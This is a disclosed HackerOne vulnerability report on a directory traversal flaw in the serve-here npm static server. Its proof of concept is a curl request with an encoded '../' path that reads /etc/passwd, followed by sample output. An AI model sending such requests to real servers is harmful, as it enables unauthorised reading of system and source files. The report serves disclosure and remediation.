---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '296254'
original_report_id: '296254'
title: '[serve-here] Static Web Server Directory Traversal via Crafted GET Request'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2017-12-08T12:44:55.679Z'
disclosed_at: '2018-01-10T20:41:50.119Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: serve-here
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [serve-here] Static Web Server Directory Traversal via Crafted GET Request

## Metadata

- HackerOne Report ID: 296254
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2018-01-10T20:41:50.119Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

A crafted GET request can be leveraged to traverse the directory structure of a host using the `serve-here` web server package, and request arbitrary files outside of the specified web root.

## Module specification
* **Name**: [serve-here](https://www.npmjs.com/package/serve-here)
* **Version**: 3.2.0 (latest release build)

## Verified conditions
* **Test server:** Ubuntu 16.04 LTS
* **cURL package**: `curl 7.55.1 (2017-08-14)`

## Proof of concept

Please install the `serve-here` package and `cd` to a chosen directory (in this case, `/root`) on your test server. Next, run `here -p 8081` to start serving from this location.

Substituting the `<server-IP>` value as appropriate, the following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:

```
curl "http://<server-IP>:8081/..%2f..%2fetc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Thanks,

Yasin

## Impact

An adversary can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
